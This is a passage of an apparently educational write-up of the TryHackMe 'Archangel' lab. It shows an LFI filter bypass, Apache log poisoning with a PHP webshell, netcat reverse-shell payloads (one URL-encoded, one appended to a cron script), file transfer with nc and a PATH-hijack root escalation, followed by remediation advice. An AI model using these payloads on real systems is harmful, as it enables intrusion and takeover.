class="c1">&nbsp;$_GET[</span><span class="c3">&#39;view&#39;</span><span class="c1">];<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</span><span class="c9">else</span><span class="c1">{<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9">echo</span><span class="c1">&nbsp;</span><span class="c3">&#39;Sorry, Thats not allowed&#39;</span><span class="c1">;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c7">?&gt;</span><span class="c1"><br> &nbsp; &nbsp;</span><span class="c19">&lt;/div&gt;</span><span class="c1"><br></span><span class="c19">&lt;/body&gt;</span><span class="c1"><br><br></span><span class="c19">&lt;/html&gt;</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">We can see that the PHP file is looking for the strings &ldquo;../..&rdquo; and /var/www/html/devleopment_testing exist in the URL . More precisely, if there is a &ldquo;../..&rdquo; string in the URL or the URL does not have /var/www/html/development_testing, then the detection will trigger. We can bypass this by using &ldquo;..//..&rdquo; which functions just like &ldquo;../..&rdquo;. </span></p><p class="c5"><span class="c13 c11">URL:</span></p><p class="c5 c10"><span class="c13 c11">http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd </span></p><p class="c5"><span class="c11 c44">Output:</span></p><p class="c5 c10"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 86.67px;"><img alt="" src="images/image10.png" style="width: 624.00px; height: 86.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c0">The payload successfully works, and we are able to include any local file that we have read permissions to. From the /etc/passwd file, we see that there is a local user by the name of archangel. Seeing as there is an open ssh port on the box, I tried to read the user&rsquo;s private ssh key to login as the user. However, the attempt to include this file proved to be unsuccessful (this may be due to us not having proper permissions, or the archangel user may not have a private ssh key). </span></p><p class="c5"><span class="c0">Although we can include sensitive files on the vulnerable system, it is necessary to convert this LFI vulnerability to an RCE (Remote Code Execution) vulnerability in order to get a shell on the target. </span></p><h4 class="c29" id="h.qdzu2aalbf2"><span class="c53 c11">Log Poisoning</span></h4><p class="c5"><span>This can be done by log poisoning</span><sup><a href="#ftnt1" id="ftnt_ref1">[1]</a></sup><span>. Looking back at the results of the </span><span class="c54"><a class="c18" href="#h.5u2vk3e7kgnj">nmap scan</a></span><span>, we can see that the http service is running the Apache version. It follows that there is most likely an apache log file at </span><span class="c24">/var/log/apache2/access.log </span><span class="c0">which can be leveraged to gain RCE. After verifying the existence of this file, I used netcat to poison the log file. </span></p><a id="t.42cf2132481ce21f182ea51d13540e33ca1a453f"></a><a id="t.5"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/tryhackme/easy/linux/archangel] &nbsp; &nbsp; &nbsp;<br>&#9492;&#9472;&#9472;&#9596; $nc mafialive.thm 80<br>GET /</span><span class="c7">&lt;?php</span><span class="c1">&nbsp;phpinfo(); </span><span class="c7">?&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>HTTP/1.1 400 Bad Request<br>Date: Sat, 01 May 2021 02:27:27 GMT<br>Server: Apache/2.4.29 (Ubuntu) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Content-Length: 301 &nbsp; <br>Connection: close &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Content-Type: text/html; charset=iso-8859-1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c7">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c19">&lt;html&gt;&lt;head&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c19">&lt;title&gt;</span><span class="c1">400 Bad Request</span><span class="c19">&lt;/title&gt;</span><span class="c1">&nbsp; &nbsp; <br></span><span class="c19">&lt;/head&gt;&lt;body&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c19">&lt;h1&gt;</span><span class="c1">Bad Request</span><span class="c19">&lt;/h1&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c19">&lt;p&gt;</span><span class="c1">Your browser sent a request that this server could not understand.</span><span class="c19">&lt;br /&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c19">&lt;/p&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c19">&lt;hr&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c19">&lt;address&gt;</span><span class="c1">Apache/2.4.29 (Ubuntu) Server at localhost Port 80</span><span class="c19">&lt;/address&gt;</span><span class="c1"><br></span><span class="c19">&lt;/body&gt;&lt;/html&gt;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">We can confirm if this attempt was successful by including this log file and viewing the output of the webpage.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 569.33px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 569.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c5"><span class="c0">Seeing as the log file outputs the PHP info, we can conclude that the malicious GET request succeeded, and the PHP code was executed on the web server. Therefore, we can send another GET request to create a PHP webshell:</span></p><a id="t.45ade85456e9852020042f90ec967760687f7bdd"></a><a id="t.6"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">&#9484;&#9472;[&#10007;]&#9472;[0xd4y@Writeup]&#9472;[~/business/tryhackme/easy/linux/archangel]<br>&#9492;&#9472;&#9472;&#9596; $nc mafialive.thm 80<br>GET /</span><span class="c7">&lt;?php</span><span class="c1">&nbsp;system($_GET[</span><span class="c3">&#39;cmd&#39;</span><span class="c1">]);</span><span class="c7">?&gt;</span><span class="c1"><br>HTTP/1.1 400 Bad Request<br>Date: Sat, 01 May 2021 02:34:25 GMT<br>Server: Apache/2.4.29 (Ubuntu)<br>Content-Length: 301<br>Connection: close<br>Content-Type: text/html; charset=iso-8859-1<br><br></span><span class="c7">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><span class="c1"><br></span><span class="c19">&lt;html&gt;&lt;head&gt;</span><span class="c1"><br></span><span class="c19">&lt;title&gt;</span><span class="c1">400 Bad Request</span><span class="c19">&lt;/title&gt;</span><span class="c1"><br></span><span class="c19">&lt;/head&gt;&lt;body&gt;</span><span class="c1"><br></span><span class="c19">&lt;h1&gt;</span><span class="c1">Bad Request</span><span class="c19">&lt;/h1&gt;</span><span class="c1"><br></span><span class="c19">&lt;p&gt;</span><span class="c1">Your browser sent a request that this server could not understand.</span><span class="c19">&lt;br /&gt;</span><span class="c1"><br></span><span class="c19">&lt;/p&gt;</span><span class="c1"><br></span><span class="c19">&lt;hr&gt;</span><span class="c1"><br></span><span class="c19">&lt;address&gt;</span><span class="c1">Apache/2.4.29 (Ubuntu) Server at localhost Port 80</span><span class="c19">&lt;/address&gt;</span><span class="c1"><br></span><span class="c19">&lt;/body&gt;&lt;/html&gt;</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">We can now get a reverse shell by sending the following payload:</span></p><p class="c5 c8"><span class="c13 c11"></span></p><p class="c5"><span class="c13 c11">Payload:</span></p><p class="c5 c10"><span class="c11 c44">http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//var/log/apache2/access.log&amp;cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff|%2Fbin%2Fsh+-i+2%3E%261|nc+10.2.29.238+9001+%3E%2Ftmp%2Ff</span></p><p class="c5 c10"><span class="c14 c44 c52">Note that a url-encoded netcat reverse shell was used &nbsp;</span></p><p class="c5 c10 c8"><span class="c52 c14 c44"></span></p><p class="c5"><span>The revshell</span><sup><a href="#ftnt2" id="ftnt_ref2">[2]</a></sup><span>&nbsp;tool was used to create the reverse shell payload, and we are able to get a shell as the </span><span class="c24">www-data</span><span>&nbsp;user</span><span>.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 201.33px;"><img alt="" src="images/image4.png" style="width: 624.00px; height: 201.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h2 class="c49" id="h.c8ig29aegdk6"><span class="c28 c11">Horizontal Privilege Escalation</span></h2><p class="c5"><span class="c0">With a low-privileged shell, we are unable to execute any commands that may lead to a privilege escalation. However, we can exploit misconfigurations on the server to potentially escalate privileges. The local user (archangel) may have some files that we have access to that could potentially lead to us compromising his or her account. We can enumerate all the files that this user owns on the local system with the following command:</span></p><a id="t.e7b363936f9ab078f099d473922719e45f8bf69e"></a><a id="t.7"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">www-data</span><span class="c7">@ubuntu</span><span class="c1">:</span><span class="c19">/home/</span><span class="c1">archangel$ find </span><span class="c19">/ -user archangel 2&gt;/</span><span class="c1">dev/</span><span class="c7">null</span><span class="c1"><br></span><span class="c19">/opt/</span><span class="c1">helloworld.sh<br></span><span class="c19">/opt/</span><span class="c1">backupfiles<br></span><span class="c19">/home/</span><span class="c1">archangel<br></span><span class="c19">/home/</span><span class="c1">archangel/.selected_editor<br></span><span class="c19">/home/</span><span class="c1">archangel/.local<br></span><span class="c19">/home/</span><span class="c1">archangel</span><span class="c19">/.local/</span><span class="c1">share<br></span><span class="c19">/home/</span><span class="c1">archangel/.profile<br></span><span class="c19">/home/</span><span class="c1">archangel/secret<br></span><span class="c19">/home/</span><span class="c1">archangel/user.txt<br></span><span class="c19">/home/</span><span class="c1">archangel/myfiles<br></span><span class="c19">/home/</span><span class="c1">archangel/.cache<br></span><span class="c19">/home/</span><span class="c1">archangel/.bash_logout<br></span><span class="c19">/home/</span><span class="c1">archangel/.bashrc</span></p></td></tr></table><p class="c8 c41"><span class="c0"></span></p><p class="c48"><span>We can see a potentially interesting file by the name of &ldquo;secret&rdquo;, however this file was a rabbit hole. There are two other interesting findings located in the </span><span class="c24">/opt</span><span>&nbsp;directory.</span><span class="c24">&nbsp;</span><span>Going into this directory and looking at the permissions of the </span><span class="c24">helloworld.sh</span><span class="c0">&nbsp;file, we see that we have full privileges on this file. </span></p><a id="t.8592ac6eff5831b496f3e12fd95144c23d498dd1"></a><a id="t.8"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">www-data@ubuntu:/opt$ ls -la<br>total 16<br>drwxrwxrwx </span><span class="c7">&nbsp;3 </span><span class="c1">root &nbsp; &nbsp; &nbsp;root &nbsp; &nbsp; </span><span class="c7">&nbsp;4096 </span><span class="c1">May </span><span class="c7">&nbsp;1 </span><span class="c1">08:23 .<br>drwxr-xr-x</span><span class="c7">&nbsp;22 </span><span class="c1">root &nbsp; &nbsp; &nbsp;root &nbsp; &nbsp; </span><span class="c7">&nbsp;4096 </span><span class="c1">Nov</span><span class="c7">&nbsp;16 </span><span class="c1">15:39 ..<br>drwxrwx--- </span><span class="c7">&nbsp;2 </span><span class="c1">archangel archangel</span><span class="c7">&nbsp;4096 </span><span class="c1">Nov</span><span class="c7">&nbsp;20 </span><span class="c1">15:04 backupfiles<br>-rwxrwxrwx </span><span class="c7">&nbsp;1 </span><span class="c1">archangel archangel </span><span class="c7">&nbsp;66 </span><span class="c1">May </span><span class="c7">&nbsp;1 </span><span class="c1">08:22 helloworld.sh</span></p></td></tr></table><p class="c41 c8"><span class="c0"></span></p><p class="c48"><span>Furthermore, we can see from </span><span class="c24">/etc/crontab</span><span class="c0">&nbsp;that there is a cronjob executing it as the archangel user.</span></p><a id="t.d61fe01f2525da1dc9747fb4cda1dc589426c8f6"></a><a id="t.9"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">www-data@ubuntu:</span><span class="c3">/opt</span><span class="c1">$ cat </span><span class="c3">/etc/crontab</span><span class="c1"><br></span><span class="c21"># /etc/crontab: system-wide crontab</span><span class="c1"><br></span><span class="c21"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span><span class="c1"><br></span><span class="c21"># command to install the new version when you edit this file</span><span class="c1"><br></span><span class="c21"># and files in /etc/cron.d. These files also have username fields,</span><span class="c1"><br></span><span class="c21"># that none of the other crontabs do.</span><span class="c1"><br><br>SHELL=</span><span class="c3">/bin/sh</span><span class="c1"><br>PATH=</span><span class="c3">/usr/local/sbin</span><span class="c1">:</span><span class="c3">/usr/local/bin</span><span class="c1">:</span><span class="c3">/sbin</span><span class="c1">:</span><span class="c3">/bin</span><span class="c1">:</span><span class="c3">/usr/sbin</span><span class="c1">:</span><span class="c3">/usr/bin</span><span class="c1"><br><br></span><span class="c21"># m h dom mon dow user &nbsp;command</span><span class="c1"><br>*</span><span class="c3">/1</span><span class="c1">&nbsp;* &nbsp; * * * &nbsp; archangel </span><span class="c3">/opt/helloworld.sh</span><span class="c1"><br>17 * &nbsp; &nbsp;* * * &nbsp; root &nbsp; &nbsp;</span><span class="c9">cd</span><span class="c1">&nbsp;/ &amp;&amp; run-parts </span><span class="c7">--report</span><span class="c1">&nbsp;</span><span class="c3">/etc/cron.hourly</span><span class="c1"><br>25 6 &nbsp; &nbsp;* * * &nbsp; root &nbsp; &nbsp;test -x </span><span class="c3">/usr/sbin/anacron</span><span class="c1">&nbsp;|| </span><span class="c7">( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><span class="c1"><br>47 6 &nbsp; &nbsp;* * 7 &nbsp; root &nbsp; &nbsp;test -x </span><span class="c3">/usr/sbin/anacron</span><span class="c1">&nbsp;|| </span><span class="c7">( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><span class="c1"><br>52 6 &nbsp; &nbsp;1 * * &nbsp; root &nbsp; &nbsp;test -x </span><span class="c3">/usr/sbin/anacron</span><span class="c1">&nbsp;|| </span><span class="c7">( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><span class="c1"><br></span><span class="c21">#</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">Therefore, we can append a reverse shell on the file and listen on the specified port.</span></p><a id="t.387c82ef9ea1e22bc4b464e8334299f2f8e349fb"></a><a id="t.10"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">www-data@ubuntu:/opt$ cat helloworld.sh <br></span><span class="c7">#!/bin/bash</span><span class="c1"><br></span><span class="c7">echo</span><span class="c1">&nbsp;</span><span class="c3">&quot;hello world&quot;</span><span class="c1">&nbsp;&gt;&gt; /opt/backupfiles/helloworld.txt<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.29.238 9002 &gt;/tmp/f</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">Eventually, the cronjob runs and we get a shell as the archangel user.</span></p><a id="t.4d06c4a5f4c0dfac76689fd4f624ef0413962c99"></a><a id="t.11"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">&#9484;&#9472;</span><span class="c3">[0xd4y@Writeup]</span><span class="c1">&#9472;</span><span class="c3">[~/business/tryhackme/easy/linux/archangel]</span><span class="c1"><br>&#9492;&#9472;&#9472;&#9596; $nc -lvnp </span><span class="c7">9002</span><span class="c1"><br>listening on </span><span class="c3">[any]</span><span class="c1">&nbsp;</span><span class="c7">9002</span><span class="c1">&nbsp;...<br>connect to </span><span class="c3">[10.2.29.238]</span><span class="c1">&nbsp;from (UNKNOWN) </span><span class="c3">[10.10.72.16]</span><span class="c1">&nbsp;</span><span class="c7">47742</span><span class="c1"><br>/bin/sh: </span><span class="c7">0</span><span class="c1">: can&#39;t access tty; job control turned off<br>$ whoami<br>archangel</span></p></td></tr></table><h2 class="c49" id="h.86wwt9vgzi00"><span class="c11 c28">Root Privilege Escalation</span></h2><p class="c5"><span>As the archangel user, we now have access to the </span><span class="c24">myfiles</span><span class="c0">&nbsp;directory located in the compromised user&rsquo;s home directory.</span></p><h3 class="c49" id="h.pue60l7cthuj"><span class="c27 c11">Binary Exploitation</span></h3><p class="c5"><span>Within this directory lies a &ldquo;backup&rdquo; file with SETUID root permissions. Upon executing this file, we can see that the binary is calling the </span><span class="c24">cp </span><span>command:</span></p><a id="t.63028820ea8216a0ac23654beffd60b72b3bcb39"></a><a id="t.12"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">./backup<br></span><span class="c3">cp:</span><span class="c1">&nbsp;cannot stat </span><span class="c3">&#39;/home/user/archangel/myfiles/*&#39;</span><span class="c1">: No such file </span><span class="c9">or</span><span class="c1">&nbsp;directory</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span>We can download this file using netcat to further analyze this binary on our attack box with Ghidra</span><sup><a href="#ftnt3" id="ftnt_ref3">[3]</a></sup><span class="c0">.</span></p><a id="t.495d92e4ce430c739b8f87e227de9f2a3a58338c"></a><a id="t.13"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">archangel@ubuntu:~/secret$ nc -w3 </span><span class="c7">10.2.29.238</span><span class="c1">&nbsp;</span><span class="c7">9001</span><span class="c1 c66">&nbsp;&lt; backup </span></p><p class="c12"><span class="c1"><br>&#9484;&#9472;</span><span class="c3">[0xd4y@Writeup]</span><span class="c1">&#9472;</span><span class="c3">[~/business/tryhackme/easy/linux/archangel]</span><span class="c1"><br>&#9492;&#9472;&#9472;&#9596; $nc -lvnp </span><span class="c7">9001</span><span class="c1">&nbsp;&gt; backup<br>listening on </span><span class="c3">[any]</span><span class="c1">&nbsp;</span><span class="c7">9001</span><span class="c1">&nbsp;...<br>connect to </span><span class="c3">[10.2.29.238]</span><span class="c1">&nbsp;from (UNKNOWN) </span><span class="c3">[10.10.72.16]</span><span class="c1">&nbsp;</span><span class="c7">42682</span><span class="c1"><br>&#9484;&#9472;</span><span class="c3">[0xd4y@Writeup]</span><span class="c1">&#9472;</span><span class="c3">[~/business/tryhackme/easy/linux/archangel]</span><span class="c1"><br>&#9492;&#9472;&#9472;&#9596; $ls<br>backup &nbsp;lfi &nbsp;nmap &nbsp;notes.txt</span></p></td></tr></table><h4 class="c29" id="h.6tkff53mhtz6"><span class="c11 c53">Reverse Engineering</span></h4><p class="c5"><span class="c0">Ghidra converts assembly code into C code. It finds that this file is relatively small with only a couple lines of code:</span></p><a id="t.55a17bd1cd889da2c2ba6c9be326593536fc5edb"></a><a id="t.14"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">undefined8 main(void)<br><br>{<br> &nbsp;setuid(</span><span class="c7">0</span><span class="c1">)</span><span class="c21">;</span><span class="c1"><br> &nbsp;setgid(</span><span class="c7">0</span><span class="c1">)</span><span class="c21">;</span><span class="c1"><br> &nbsp;system(</span><span class="c3">&quot;cp /home/user/archangel/myfiles/* /opt/backupfiles&quot;</span><span class="c1">)</span><span class="c21">;</span><span class="c1"><br> &nbsp;return </span><span class="c7">0</span><span class="c21">;</span><span class="c1"><br>}</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span>As can be seen, the binary is calling the </span><span class="c24">cp</span><span class="c0">&nbsp;command without using a full path. </span></p><h4 class="c29" id="h.sawpdgpmtqpi"><span class="c53 c11">Command Injection</span></h4><p class="c5"><span>Thus, we can exploit this vulnerability by creating a file called </span><span class="c24">cp</span><span>&nbsp;and modifying our PATH environment variable to prioritize the location of this malicious file</span><sup><a href="#ftnt4" id="ftnt_ref4">[4]</a></sup><span class="c0">:</span></p><a id="t.79f874a14a361c759d4d87613cd4f0c56d2ed4a5"></a><a id="t.15"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">cat cp<br>/bin/bash<br>archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">chmod +x cp<br>archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">echo </span><span class="c19">$PATH</span><span class="c1"><br>/usr/local/</span><span class="c3">sbin:</span><span class="c1">/usr/local/</span><span class="c3">bin:</span><span class="c1">/</span><span class="c3">sbin:</span><span class="c1">/</span><span class="c3">bin:</span><span class="c1">/usr/</span><span class="c3">sbin:</span><span class="c1">/usr/bin<br>archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">export PATH=.</span><span class="c3">:</span><span class="c19">$PATH</span><span class="c1"><br>archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">ls<br>backup &nbsp;cp &nbsp;user2.txt</span></p></td></tr></table><p class="c35 c8"><span class="c0"></span></p><p class="c5"><span class="c0">Now when we execute the backup binary, it will run our malicious file instead of the intended command.</span></p><a id="t.6ba5e1c0b636fc26bc89b47fc79c6d0ea559bf9c"></a><a id="t.16"></a><table class="c4"><tr class="c36"><td class="c17" colspan="1" rowspan="1"><p class="c12"><span class="c1">archangel</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c19">$ </span><span class="c1">./backup<br>root</span><span class="c19">@ubuntu</span><span class="c3">:~/secret</span><span class="c21"># id</span><span class="c1"><br>uid=</span><span class="c7">0</span><span class="c1">(root) gid=</span><span class="c7">0</span><span class="c1">(root) groups=</span><span class="c7">0</span><span class="c1">(root),</span><span class="c7">1001</span><span class="c1">(archangel)</span></p></td></tr></table><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><h1 class="c45" id="h.gs1ewfmvc73g"><span class="c42">Conclusion</span></h1><p class="c5 c8"><span class="c22"></span></p><p class="c5"><span class="c0">The client is running a vulnerable http service that is at risk of being exploited. A malicious attacker can achieve full root access on this system without trouble. This system must be patched as soon as possible, and the following remediations will provide a stronger defense against possible attacks:</span></p><ul class="c33 lst-kix_8am5cgb10zm3-0 start"><li class="c5 c20 li-bullet-0"><span class="c0">Modify the test.php script on the development site to not include user-inputted files</span></li></ul><ul class="c33 lst-kix_8am5cgb10zm3-1 start"><li class="c5 c25 li-bullet-0"><span class="c0">The script can be modified to only whitelist certain file names</span></li><li class="c5 c25 li-bullet-0"><span class="c0">Failure to correctly include files resulted in a critical RCE vulnerability</span></li></ul><ul class="c33 lst-kix_8am5cgb10zm3-0"><li class="c5 c20 li-bullet-0"><span class="c0">Be mindful of misconfigurations within the local system</span></li></ul><ul class="c33 lst-kix_8am5cgb10zm3-1 start"><li class="c5 c25 li-bullet-0"><span class="c0">The www-data user was able to modify a critical cronjob run as the archangel user, which allowed for horizontal privilege escalation </span></li></ul><ul class="c33 lst-kix_8am5cgb10zm3-0"><li class="c5 c20 li-bullet-0"><span class="c0">Always use full paths when performing any action as a privileged user</span></li></ul><ul class="c33 lst-kix_8am5cgb10zm3-1 start"><li class="c5 c25 li-bullet-0"><span class="c0">Due to the improper use of a command in a binary running as root, we were able to escalate privileges to the root user through modifying the PATH environment variable </span></li></ul><p class="c5"><span>It is highly encouraged that the system be patched as soon as possible with the aforementioned remediations.</span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><p class="c5 c8"><span class="c0"></span></p><div><p class="c8 c75"><span class="c13 c11"></span></p></div><hr class="c59"><div><p class="c32"><a href="#ftnt_ref1" id="ftnt1">[1]</a><span class="c44">&nbsp;</span><span class="c43"><a class="c18" href="https://www.google.com/url?q=https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&amp;sa=D&amp;source=editors&amp;ust=1653795832279006&amp;usg=AOvVaw0vYqPLqqpfLH1no_AIDnyO">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></span><span class="c13 c14">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref2" id="ftnt2">[2]</a><span class="c44">&nbsp;</span><span class="c43"><a class="c18" href="https://www.google.com/url?q=https://github.com/0xd4y/RevShell&amp;sa=D&amp;source=editors&amp;ust=1653795832279311&amp;usg=AOvVaw1Nq-uwG2S7SbKUK87iQimZ">https://github.com/0xd4y/RevShell</a></span><span class="c13 c14">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref3" id="ftnt3">[3]</a><span class="c44">&nbsp;</span><span class="c43"><a class="c18" href="https://www.google.com/url?q=https://github.com/NationalSecurityAgency/ghidra&amp;sa=D&amp;source=editors&amp;ust=1653795832279536&amp;usg=AOvVaw0poo_jDK2AMc-8bKRwapo3">https://github.com/NationalSecurityAgency/ghidra</a></span><span class="c13 c14">&nbsp;</span></p></div><div><p class="c32"><a href="#ftnt_ref4" id="ftnt4">[4]</a><span class="c44">&nbsp;</span><span class="c43"><a class="c18" href="https://www.google.com/url?q=https://owasp.org/www-community/attacks/Command_Injection&amp;sa=D&amp;source=editors&amp;ust=1653795832279759&amp;usg=AOvVaw1S6mvU5d9Uujc94ekfUZTm">https://owasp.org/www-community/attacks/Command_Injection</a></span><span class="c13 c14">&nbsp;</span></p></div></body></html>